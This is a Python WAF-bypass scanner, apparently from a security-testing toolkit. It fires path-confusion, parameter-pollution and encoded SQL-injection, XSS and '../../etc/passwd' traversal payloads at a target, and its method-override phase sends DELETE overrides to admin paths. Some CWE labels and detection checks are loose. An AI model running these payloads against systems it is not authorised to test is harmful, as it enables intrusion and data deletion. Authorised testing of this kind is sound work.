#!/usr/bin/env python3
"""WAF Bypass Scanner — WAF evasion via path confusion, HPP, encoding (CWE-178/434/89/79).

Tests common WAF bypass techniques:
- Path normalization confusion (/api/v1/..;/admin)
- HTTP Parameter Pollution (?id=1&id=2)
- Double/triple URL encoding
- Unicode normalization attacks
- HTTP method override headers
- Content-Type confusion

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import sys
import os

sys.path.insert(0, os.path.dirname(__file__))

from lib import (
    Finding, RateLimitedSession, get_session_from_env, log,
    parse_base_args, save_findings, load_config,
)

# ---------------------------------------------------------------------------
# Bypass technique payloads
# ---------------------------------------------------------------------------

PATH_CONFUSION_PAYLOADS = [
    "/..;/admin",
    "/%2e%2e/admin",
    "/..%252f..%252fadmin",
    "/.;/admin",
    "/admin;.css",
    "/admin%20",
    "/admin%09",
    "/admin/..",
    "/ADMIN",  # Case sensitivity
    "/admin%00.html",
]

HPP_PAYLOADS = [
    ("id", ["1", "1 OR 1=1"]),
    ("q", ["test", "<script>alert(1)</script>"]),
    ("page", ["1", "../../etc/passwd"]),
]

ENCODING_PAYLOADS = [
    ("<script>", "%3Cscript%3E", "single-encode"),
    ("<script>", "%253Cscript%253E", "double-encode"),
    ("../etc/passwd", "..%252f..%252fetc%252fpasswd", "double-encode-path"),
    ("' OR 1=1--", "%27%20OR%201%3D1--", "sqli-encode"),
]

METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override",
    "X-Method-Override",
    "X-HTTP-Method",
    "_method",
]

CONTENT_TYPE_BYPASSES = [
    "application/json",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/plain",
    "text/xml",
    "application/xml",
]

# ---------------------------------------------------------------------------
# Default test paths (generic)
# ---------------------------------------------------------------------------

DEFAULT_TEST_PATHS = [
    "/admin", "/api/admin", "/api/v1/admin", "/internal",
    "/debug", "/swagger", "/api-docs", "/.env",
    "/wp-admin", "/phpmyadmin", "/graphql",
]


def scan_path_confusion(
    session: RateLimitedSession,
    target: str,
    test_paths: list[str],
    dry_run: bool = False,
) -> list[Finding]:
    """Test path normalization confusion bypasses."""
    findings: list[Finding] = []

    for base_path in test_paths:
        for payload in PATH_CONFUSION_PAYLOADS:
            url = f"{target.rstrip('/')}{payload.replace('/admin', base_path)}"
            if dry_run:
                log.info("[DRY-RUN] GET %s", url)
                continue

            try:
                resp = session.get(url, allow_redirects=False)
                if resp.status_code in (200, 301, 302, 403):
                    # 200 on admin path = bypass confirmed
                    if resp.status_code == 200:
                        findings.append(Finding(
                            title=f"WAF Bypass: Path confusion on {base_path}",
                            severity="high",
                            cwe="CWE-178",
                            endpoint=url,
                            method="GET",
                            description=f"Path confusion payload bypassed WAF. Got {resp.status_code} on protected path.",
                            steps=[
                                f"Send GET {url}",
                                f"Observe {resp.status_code} response (expected 403/404)",
                            ],
                            impact="Access to restricted endpoints bypassing WAF rules",
                            evidence={"status": resp.status_code, "payload": payload, "size": len(resp.content)},
                            remediation="Normalize paths before WAF evaluation. Use strict URL parsing.",
                        ))
            except Exception as e:
                log.debug("Path confusion error: %s", e)

    return findings


def scan_hpp(
    session: RateLimitedSession,
    target: str,
    dry_run: bool = False,
) -> list[Finding]:
    """Test HTTP Parameter Pollution."""
    findings: list[Finding] = []

    for param, values in HPP_PAYLOADS:
        # Send duplicate parameters
        url = f"{target.rstrip('/')}/?{param}={values[0]}&{param}={values[1]}"
        if dry_run:
            log.info("[DRY-RUN] GET %s", url)
            continue

        try:
            resp = session.get(url, allow_redirects=False)
            # Check if the malicious value was reflected or processed
            body = resp.text.lower()
            if values[1].lower() in body or resp.status_code == 200:
                findings.append(Finding(
                    title=f"HTTP Parameter Pollution: {param}",
                    severity="medium",
                    cwe="CWE-235",
                    endpoint=url,
                    method="GET",
                    description=f"Duplicate parameter '{param}' may bypass server-side validation.",
                    steps=[
                        f"Send GET with duplicate param: {param}={values[0]}&{param}={values[1]}",
                        f"Check if second value is processed",
                    ],
                    impact="WAF bypass via parameter pollution, potential injection",
                    evidence={"status": resp.status_code, "reflected": values[1].lower() in body},
                    remediation="Use the first parameter value only. Reject duplicate parameters.",
                ))
        except Exception as e:
            log.debug("HPP error: %s", e)

    return findings


def scan_method_override(
    session: RateLimitedSession,
    target: str,
    test_paths: list[str],
    dry_run: bool = False,
) -> list[Finding]:
    """Test HTTP method override headers."""
    findings: list[Finding] = []

    for path in test_paths[:5]:
        url = f"{target.rstrip('/')}{path}"
        for header in METHOD_OVERRIDE_HEADERS:
            if dry_run:
                log.info("[DRY-RUN] POST %s with %s: DELETE", url, header)
                continue

            try:
                resp = session.post(url, headers={header: "DELETE"})
                if resp.status_code in (200, 204):
                    findings.append(Finding(
                        title=f"Method Override: {header} accepted on {path}",
                        severity="high",
                        cwe="CWE-434",
                        endpoint=url,
                        method="POST",
                        description=f"Server accepts {header} header to override HTTP method.",
                        steps=[
                            f"POST {url} with header {header}: DELETE",
                            f"Observe {resp.status_code} response",
                        ],
                        impact="Bypass method-based access controls (e.g., DELETE via POST)",
                        evidence={"status": resp.status_code, "header": header},
                        remediation="Reject method override headers. Use explicit HTTP methods.",
                    ))
            except Exception as e:
                log.debug("Method override error: %s", e)

    return findings


def scan_encoding_bypass(
    session: RateLimitedSession,
    target: str,
    dry_run: bool = False,
) -> list[Finding]:
    """Test encoding-based WAF bypasses."""
    findings: list[Finding] = []

    for original, encoded, technique in ENCODING_PAYLOADS:
        url = f"{target.rstrip('/')}/?q={encoded}"
        if dry_run:
            log.info("[DRY-RUN] GET %s (%s)", url, technique)
            continue

        try:
            resp = session.get(url, allow_redirects=False)
            # If WAF doesn't block (200 instead of 403), encoding bypass works
            if resp.status_code == 200:
                findings.append(Finding(
                    title=f"WAF Encoding Bypass: {technique}",
                    severity="medium",
                    cwe="CWE-178",
                    endpoint=url,
                    method="GET",
                    description=f"WAF did not detect {technique} encoded payload.",
                    steps=[
                        f"Original payload: {original}",
                        f"Encoded as: {encoded} ({technique})",
                        f"Sent to {url}",
                        f"Response: {resp.status_code}",
                    ],
                    impact="Injection payloads may bypass WAF via encoding",
                    evidence={"status": resp.status_code, "technique": technique, "encoded": encoded},
                    remediation="Decode all URL encoding layers before WAF inspection. Apply recursive decoding.",
                ))
        except Exception as e:
            log.debug("Encoding bypass error: %s", e)

    return findings


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main() -> None:
    parser = parse_base_args()
    parser.add_argument("--paths", nargs="*", default=None,
                        help="Custom paths to test (default: common admin/debug paths)")
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    session = get_session_from_env()
    if args.rate_limit:
        session.min_interval = 1.0 / args.rate_limit

    config = load_config(args.config)
    test_paths = args.paths or config.get("test_paths", DEFAULT_TEST_PATHS)

    all_findings: list[Finding] = []

    log.info("=== WAF Bypass Scanner starting on %s ===", args.target)

    log.info("--- Phase 1: Path Confusion ---")
    all_findings.extend(scan_path_confusion(session, args.target, test_paths, args.dry_run))

    log.info("--- Phase 2: HTTP Parameter Pollution ---")
    all_findings.extend(scan_hpp(session, args.target, args.dry_run))

    log.info("--- Phase 3: Method Override ---")
    all_findings.extend(scan_method_override(session, args.target, test_paths, args.dry_run))

    log.info("--- Phase 4: Encoding Bypass ---")
    all_findings.extend(scan_encoding_bypass(session, args.target, args.dry_run))

    log.info("=== WAF Bypass Scanner complete: %d findings ===", len(all_findings))
    save_findings(all_findings, "waf-bypass")


if __name__ == "__main__":
    import logging
    main()
